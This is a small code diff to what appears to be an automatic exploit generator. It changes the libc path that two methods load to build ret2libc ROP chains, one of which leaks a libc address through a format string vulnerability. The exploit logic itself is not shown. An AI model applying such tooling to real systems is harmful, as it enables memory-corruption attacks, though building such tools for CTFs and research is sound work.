@@ -236,7 +236,7 @@ class AEG:
 
 	# Use a given leaked address to craft a ret2libc ROP chain
 	def ret2libc(self, padding):
-		libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.32.so')
+		libc = ELF('/opt/libc.so.6')
 		r = ROP(libc)
 		leaked = -1
 		# Grab the leaked address
@@ -273,7 +273,7 @@ class AEG:
 
 	# Use format string vuln to leak a libc address, then craft ret2libc ROP chain
 	def ret2libc_leak(self, padding):
-		libc = ELF('/usr/lib/x86_64-linux-gnu/libc-2.32.so')
+		libc = ELF('/opt/libc.so.6')
 		r = ROP(libc)
 		case = -1
 		for i in range(300):
